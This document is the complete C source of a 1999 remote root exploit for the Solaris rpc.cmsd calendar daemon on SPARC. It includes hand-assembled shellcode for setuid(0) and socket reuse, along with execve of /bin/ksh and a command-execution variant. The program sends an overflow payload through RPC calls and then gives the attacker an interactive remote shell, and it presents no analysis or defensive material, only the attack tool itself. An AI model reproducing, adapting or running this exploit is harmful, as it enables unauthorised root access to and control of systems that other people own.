/*## copyright LAST STAGE OF DELIRIUM jul 1999 poland        *://lsd-pl.net/ #*/
/*## rpc.cmsd                                                                #*/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <rpc/rpc.h>
#include <netdb.h>
#include <stdio.h>
#include <errno.h>

#define ADRNUM 1500
#define NOPNUM 1600

#define CMSD_PROG 100068
#define CMSD_VERS 4
#define CMSD_PING 0
#define CMSD_CREATE 21
#define CMSD_INSERT 6

char findsckcode[]=
    "\x20\xbf\xff\xff"     /* bn,a    <findsckcode-4>      */
    "\x20\xbf\xff\xff"     /* bn,a    <findsckcode>        */
    "\x7f\xff\xff\xff"     /* call    <findsckcode+4>      */
    "\xa0\x20\x3f\xff"     /* sub     %g0,-1,%l0           */
    "\xa4\x03\xff\xd0"     /* add     %o7,-48,%l2          */
    "\xa6\x10\x20\x44"     /* mov     0x44,%l3             */
    "\xa8\x10\x23\xff"     /* mov     0x3ff,%l4            */
    "\xaa\x03\xe0\x44"     /* add     %o7,68,%l5           */
    "\x81\xc5\x60\x08"     /* jmp     %l5+8                */

    "\xaa\x10\x20\xff"     /* mov     0xff,%l5             */
    "\xab\x2d\x60\x08"     /* sll     %l5,8,%l5            */
    "\xaa\x15\x60\xff"     /* or      %l5,0xff,%l5         */
    "\xe2\x03\xff\xd0"     /* ld      [%o7-48],%l1         */
    "\xac\x0c\x40\x15"     /* and     %l1,%l5,%l6          */
    "\x2b\x00\x00\x00"     /* sethi   %hi(0x00000000),%l5  */
    "\xaa\x15\x60\x00"     /* or      %l5,0x000,%l5        */
    "\xac\x05\x40\x16"     /* add     %l5,%l6,%l6          */
    "\xac\x05\xbf\xff"     /* add     %l6,-1,%l6           */
    "\x80\xa5\xbf\xff"     /* cmp     %l6,-1               */
    "\x02\xbf\xff\xf5"     /* be      <findsckcode+32>     */
    "\xaa\x03\xe0\x7c"     /* add     %o7,0x7c,%l5         */

    "\xe6\x23\xff\xc4"     /* st      %l3,[%o7-60]         */
    "\xc0\x23\xff\xc8"     /* st      %g0,[%o7-56]         */
    "\xe4\x23\xff\xcc"     /* st      %l2,[%o7-52]         */
    "\x90\x04\x3f\xff"     /* add     %l0,-1,%o0           */
    "\xaa\x10\x20\x54"     /* mov     0x54,%l5             */
    "\xad\x2d\x60\x08"     /* sll     %l5,8,%l6            */
    "\x92\x15\xa0\x91"     /* or      %l6,0x91,%o1         */
    "\x94\x03\xff\xc4"     /* add     %o7,-60,%o2          */
    "\x82\x10\x20\x36"     /* mov     0x36,%g1             */
    "\x91\xd0\x20\x08"     /* ta      8                    */
    "\xa0\x24\x3f\xff"     /* sub     %l0,-1,%l0           */
    "\x1a\xbf\xff\xe9"     /* bcc     <findsckcode+36>     */
    "\x80\xa4\x23\xff"     /* cmp     %l0,0x3ff            */
    "\x04\xbf\xff\xf3"     /* bl      <findsckcode+84>     */

    "\xaa\x20\x3f\xff"     /* sub     %g0,-1,%l5           */
    "\x90\x05\x7f\xff"     /* add     %l5,-1,%o0           */
    "\x82\x10\x20\x06"     /* mov     0x6,%g1              */
    "\x91\xd0\x20\x08"     /* ta      8                    */
    "\x90\x04\x3f\xfe"     /* add     %l0,-2,%o0           */
    "\x82\x10\x20\x29"     /* mov     0x29,%g1             */
    "\x91\xd0\x20\x08"     /* ta      8                    */
    "\xaa\x25\x7f\xff"     /* sub     %l5,-1,%l5           */
    "\x80\xa5\x60\x03"     /* cmp     %l5,3                */
    "\x04\xbf\xff\xf8"     /* ble     <findsckcode+144>    */
    "\x80\x1c\x40\x11"     /* xor     %l1,%l1,%g0          */
;

char setuidcode[]=
    "\x90\x08\x3f\xff"     /* and     %g0,-1,%o0           */
    "\x82\x10\x20\x17"     /* mov     0x17,%g1             */
    "\x91\xd0\x20\x08"     /* ta      8                    */
;

char shellcode[]=
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode-4>        */
    "\x20\xbf\xff\xff"     /* bn,a    <shellcode>          */
    "\x7f\xff\xff\xff"     /* call    <shellcode+4>        */
    "\x90\x03\xe0\x24"     /* add     %o7,32,%o0           */
    "\x92\x02\x20\x10"     /* add     %o0,16,%o1           */
    "\x98\x03\xe0\x24"     /* add     %o7,32,%o4           */
    "\xc0\x23\x20\x08"     /* st      %g0,[%o4+8]          */
    "\xd0\x23\x20\x10"     /* st      %o0,[%o4+16]         */
    "\xc0\x23\x20\x14"     /* st      %g0,[%o4+20]         */
    "\x82\x10\x20\x0b"     /* mov     0xb,%g1              */
    "\x91\xd0\x20\x08"     /* ta      8                    */
    "/bin/ksh"
;

char cmdshellcode[]=
    "\x20\xbf\xff\xff"     /* bn,a    <cmdshellcode-4>     */
    "\x20\xbf\xff\xff"     /* bn,a    <cmdshellcode>       */
    "\x7f\xff\xff\xff"     /* call    <cmdshellcode+4>     */
    "\x90\x03\xe0\x34"     /* add     %o7,52,%o0           */
    "\x92\x23\xe0\x20"     /* sub     %o7,32,%o1           */
    "\xa2\x02\x20\x0c"     /* add     %o0,12,%l1           */
    "\xa4\x02\x20\x10"     /* add     %o0,16,%l2           */
    "\xc0\x2a\x20\x08"     /* stb     %g0,[%o0+8]          */
    "\xc0\x2a\x20\x0e"     /* stb     %g0,[%o0+14]         */
    "\xd0\x23\xff\xe0"     /* st      %o0,[%o7-32]         */
    "\xe2\x23\xff\xe4"     /* st      %l1,[%o7-28]         */
    "\xe4\x23\xff\xe8"     /* st      %l2,[%o7-24]         */
    "\xc0\x23\xff\xec"     /* st      %g0,[%o7-20]         */
    "\x82\x10\x20\x0b"     /* mov     0xb,%g1              */
    "\x91\xd0\x20\x08"     /* ta      8                    */
    "/bin/ksh    -c  "
;

static char nop[]="\x80\x1c\x40\x11";

typedef struct{char *target,*new_target;}req1_t;

typedef struct{
    struct{long tick,key;}appt_id;
    void *tag;
    int duration,ntimes;
    char *what;
    struct{int period,nth;long enddate;}period;
    char *author,*client_data;
    void *exception,*attr;
    int appt_status,privacy;
    void *next;
}appt_t;

typedef struct{
    char *target;
    struct{
        int tag;
        union{struct{void *v1,*v2;int i;}apptid;appt_t *appt;}args_u;
    }args;
    int pid;
}req2_t;

bool_t xdr_req1(XDR *xdrs,req1_t *obj){
    if(!xdr_string(xdrs,&obj->target,~0)) return(FALSE);
    if(!xdr_string(xdrs,&obj->new_target,~0)) return(FALSE);
}

bool_t xdr_appt(XDR *xdrs,appt_t *objp){
    char *v=NULL;long l=0;int i=0;
    if(!xdr_long(xdrs,&l)) return(FALSE);
    if(!xdr_long(xdrs,&l)) return(FALSE);
    if(!xdr_pointer(xdrs,&v,0,(xdrproc_t)NULL)) return(FALSE);
    if(!xdr_int(xdrs,&i)) return(FALSE);
    if(!xdr_int(xdrs,&objp->ntimes)) return(FALSE);
    if(!xdr_string(xdrs,&objp->what,~0)) return(FALSE);
    if(!xdr_int(xdrs,&objp->period.period)) return(FALSE);
    if(!xdr_int(xdrs,&i)) return(FALSE);
    if(!xdr_long(xdrs,&l)) return(FALSE);
    if(!xdr_string(xdrs,&objp->author,~0)) return(FALSE);
    if(!xdr_string(xdrs,&objp->client_data,~0)) return(FALSE);
    if(!xdr_pointer(xdrs,&v,0,(xdrproc_t)NULL)) return(FALSE);
    if(!xdr_pointer(xdrs,&v,0,(xdrproc_t)NULL)) return(FALSE);
    if(!xdr_int(xdrs,&i)) return(FALSE);
    if(!xdr_int(xdrs,&i)) return(FALSE);
    if(!xdr_pointer(xdrs,&v,0,(xdrproc_t)NULL)) return(FALSE);
    return(TRUE);
}

bool_t xdr_req2(XDR *xdrs,req2_t *obj){
    if(!xdr_string(xdrs,&obj->target,~0)) return(FALSE);
    if(!xdr_int(xdrs,&obj->args.tag)) return(FALSE);
    if(!xdr_pointer(xdrs,(char**)&obj->args.args_u.appt,sizeof(appt_t),
        xdr_appt)) return(FALSE);
    if(!xdr_int(xdrs,&obj->pid)) return(FALSE);
    return(TRUE);
}

main(int argc,char **argv){
    char buffer[30000],address[4],*b,*cmd;
    int i,c,n,flag=0,vers=7,port=0,sck;
    CLIENT *cl;enum clnt_stat stat;
    struct hostent *hp;
    struct sockaddr_in adr;
    struct timeval tm={10,0};
    req1_t req1;req2_t req2;appt_t ap;
    char calendar[32];

    printf("copyright LAST STAGE OF DELIRIUM jul 1999 poland  //lsd-pl.net/\n");
    printf("rpc.cmsd for solaris 2.5 2.5.1 2.6 2.7 sparc\n\n");

    if(argc<2){
        printf("usage: %s address [-t][-s|-c command] [-p port] [-v 5|6|7]\n",
            argv[0]);
        exit(-1);
    }

    while((c=getopt(argc-1,&argv[1],"tsc:p:v:"))!=-1){
        switch(c){
        case 't': flag|=4;break;
        case 's': flag|=2;break;
        case 'c': flag|=1;cmd=optarg;break;
        case 'p': port=atoi(optarg);break;
        case 'v': vers=atoi(optarg);
        }
    }

    if(vers==5) *(unsigned long*)address=htonl(0xefffcf48+600);
    if(vers==6) *(unsigned long*)address=htonl(0xefffed0c+100);
    if(vers==7) *(unsigned long*)address=htonl(0xffbeea8c+600);

    printf("adr=0x%08x timeout=%d ",ntohl(*(unsigned long*)address),tm.tv_sec);
    fflush(stdout);

    adr.sin_family=AF_INET;
    adr.sin_port=htons(port);
    if((adr.sin_addr.s_addr=inet_addr(argv[1]))==-1){
        if((hp=gethostbyname(argv[1]))==NULL){
            errno=EADDRNOTAVAIL;perror("\nerror");exit(-1);
        }
        memcpy(&adr.sin_addr.s_addr,hp->h_addr,4);
    }else{
        if((hp=gethostbyaddr((char*)&adr.sin_addr.s_addr,4,AF_INET))==NULL){
            errno=EADDRNOTAVAIL;perror("\nerror");exit(-1);
        }
    }
    if((b=(char*)strchr(hp->h_name,'.'))!=NULL) *b=0;

    if(flag&4){
        sck=RPC_ANYSOCK;
        if(!(cl=clntudp_create(&adr,CMSD_PROG,CMSD_VERS,tm,&sck))){
            clnt_pcreateerror("\nerror");exit(-1);
        }
        stat=clnt_call(cl,CMSD_PING,xdr_void,NULL,xdr_void,NULL,tm);
        if(stat!=RPC_SUCCESS) {clnt_perror(cl,"\nerror");exit(-1);}
        clnt_destroy(cl);
        if(flag==4) {printf("sent!\n");exit(0);}
    }

    adr.sin_port=htons(port);

    sck=RPC_ANYSOCK;
    if(!(cl=clnttcp_create(&adr,CMSD_PROG,CMSD_VERS,&sck,0,0))){
        clnt_pcreateerror("\nerror");exit(-1);
    }
    cl->cl_auth=authunix_create(hp->h_name,0,0,0,NULL);

    sprintf(calendar,"xxx.XXXXXX");
    req1.target=mktemp(calendar);
    req1.new_target="";

    stat=clnt_call(cl,CMSD_CREATE,xdr_req1,&req1,xdr_void,NULL,tm);
    if(stat!=RPC_SUCCESS) {clnt_perror(cl,"\nerror");exit(-1);}

    b=buffer;
    for(i=0;i<ADRNUM;i++) *b++=address[i%4]; 
    *b=0;
    b=&buffer[2000];
    for(i=0;i<2;i++) *b++=0xff; 
    for(i=0;i<NOPNUM;i++) *b++=nop[i%4]; 

    if(flag&2){
        i=sizeof(struct sockaddr_in);
        if(getsockname(sck,(struct sockaddr*)&adr,&i)==-1){
            struct{unsigned int maxlen;unsigned int len;char *buf;}nb;
            ioctl(sck,(('S'<<8)|2),"sockmod");
            nb.maxlen=0xffff;
            nb.len=sizeof(struct sockaddr_in);;
            nb.buf=(char*)&adr;
            ioctl(sck,(('T'<<8)|144),&nb);
        }
        n=-ntohs(adr.sin_port);
        printf("port=%d connected! ",-n);fflush(stdout);

        *((unsigned long*)(&findsckcode[56]))|=htonl((n>>10)&0x3fffff);
        *((unsigned long*)(&findsckcode[60]))|=htonl(n&0x3ff);
        for(i=0;i<strlen(setuidcode);i++) *b++=setuidcode[i];
        for(i=0;i<strlen(findsckcode);i++) *b++=findsckcode[i];
        for(i=0;i<strlen(shellcode);i++) *b++=shellcode[i];
    }else{
        for(i=0;i<strlen(setuidcode);i++) *b++=setuidcode[i];
        for(i=0;i<strlen(cmdshellcode);i++) *b++=cmdshellcode[i];
        for(i=0;i<strlen(cmd);i++) *b++=cmd[i];
        *b++=';';
        for(i=0;i<3+4-((strlen(cmd)%4));i++) *b++=0xff;
    }
    *b=0;

    ap.client_data=buffer;
    ap.what=&buffer[2000];
    ap.author="";
    ap.ntimes=1;
    ap.period.period=1;
    req2.target=calendar;
    req2.args.tag=3;
    req2.args.args_u.appt=&ap;

    stat=clnt_call(cl,CMSD_INSERT,xdr_req2,&req2,xdr_void,NULL,tm);
    if(stat==RPC_SUCCESS) {printf("\nerror: not vulnerable\n");exit(-1);}
    printf("sent!\n");if(flag&1) exit(0);

    write(sck,"/bin/uname -a\n",14);
    while(1){
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(0,&fds);
        FD_SET(sck,&fds);
        if(select(FD_SETSIZE,&fds,NULL,NULL,NULL)){
            int cnt;
            char buf[1024];
            if(FD_ISSET(0,&fds)){
                if((cnt=read(0,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(sck,buf,cnt);
            }
            if(FD_ISSET(sck,&fds)){
                if((cnt=read(sck,buf,1024))<1){
                    if(errno==EWOULDBLOCK||errno==EAGAIN) continue;
                    else break;
                }
                write(1,buf,cnt);
            }
        }
    }
}
